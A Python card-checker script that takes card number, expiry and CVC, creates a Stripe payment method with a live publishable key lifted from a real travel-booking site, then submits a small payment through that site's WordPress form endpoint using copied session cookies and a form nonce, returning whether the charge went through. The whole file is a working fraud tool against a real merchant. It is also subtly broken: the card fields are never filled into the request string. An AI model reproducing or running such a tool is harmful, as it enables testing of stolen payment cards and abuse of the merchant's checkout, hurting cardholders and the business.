import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = 'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Oe3NUEpTJxV8SbJDWoFpChd6uOH5LkwCtH8snX4kLtb6T1M2tvEbUo2AnK83Y5gjy0X2jqaKuZefCqryHo1CABG00IQ4Wvcvu'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_fbp': 'fb.1.1740014449284.971801600910098439',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-02-20%2001%3A20%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOooWba69qs4M2Ia7BDMOTxVfVDelTTV5nRS1AWiAUfFyxmT-DTUU%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_first_add': 'fd%3D2025-02-20%2001%3A20%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOooWba69qs4M2Ia7BDMOTxVfVDelTTV5nRS1AWiAUfFyxmT-DTUU%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOooWba69qs4M2Ia7BDMOTxVfVDelTTV5nRS1AWiAUfFyxmT-DTUU',
	    '_ga_J2GTJFT1S5': 'GS1.1.1740014449.1.0.1740014449.60.0.1127150599',
	    '_ga': 'GA1.1.2111808786.1740014450',
	    '_gcl_au': '1.1.410797204.1740014450',
	    'wp-wpml_current_language': 'en',
	    'partnero_session_uuid': '21ec76c6-37e8-4769-aa1e-9749c7f01a67',
	    '__stripe_mid': '9c563d72-32aa-4823-b4fb-8f5b02639c130d9401',
	    '__stripe_sid': '0264737e-44e6-4782-a24f-344a45ec53c2804d39',
	}
	
	headers = {
	    'authority': 'ountravela.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_fbp=fb.1.1740014449284.971801600910098439; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-02-20%2001%3A20%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOooWba69qs4M2Ia7BDMOTxVfVDelTTV5nRS1AWiAUfFyxmT-DTUU%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-02-20%2001%3A20%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOooWba69qs4M2Ia7BDMOTxVfVDelTTV5nRS1AWiAUfFyxmT-DTUU%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fountravela.com%2Fen%2Fladakh-rental-booking-bike%2F%3Fsrsltid%3DAfmBOooWba69qs4M2Ia7BDMOTxVfVDelTTV5nRS1AWiAUfFyxmT-DTUU; _ga_J2GTJFT1S5=GS1.1.1740014449.1.0.1740014449.60.0.1127150599; _ga=GA1.1.2111808786.1740014450; _gcl_au=1.1.410797204.1740014450; wp-wpml_current_language=en; partnero_session_uuid=21ec76c6-37e8-4769-aa1e-9749c7f01a67; __stripe_mid=9c563d72-32aa-4823-b4fb-8f5b02639c130d9401; __stripe_sid=0264737e-44e6-4782-a24f-344a45ec53c2804d39',
	    'origin': 'https://ountravela.com',
	    'referer': 'https://ountravela.com/en/ladakh-rental-booking-bike/?srsltid=AfmBOooWba69qs4M2Ia7BDMOTxVfVDelTTV5nRS1AWiAUfFyxmT-DTUU',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1740014489446',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=26737&_fluentform_80_fluentformnonce=8b6b303985&_wp_http_referer=%2Fen%2Fladakh-rental-booking-bike%2F&names%5Bfirst_name%5D=&names%5Blast_name%5D=&phone=&email=rodamuser20%40gmail.com&country-list=FR&bnr_people=2&nbr_bike=1&datetime=28%2F02%2F2025&nbr_day=5&dropdown_1=Himalayan%20410%20-%202000%20INR%20%2F%20day&numeric_bike1_himalayan410=10000&input_radio_carrier=yes&numeric_field_carrier=500&input_radio_InnerLinePermit=yes&numeric_field_InnerLinePermit=2000&input_radio_assistance=no&numeric_total_inr=12500&numeric_10_inr=1250&numeric-field_7=11250&input_text=&custom-payment-amount_1=1.00&payment_method=stripe&terms-n-condition_1=on&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '80',
	}
	
	r2 = requests.post(
	    'https://ountravela.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
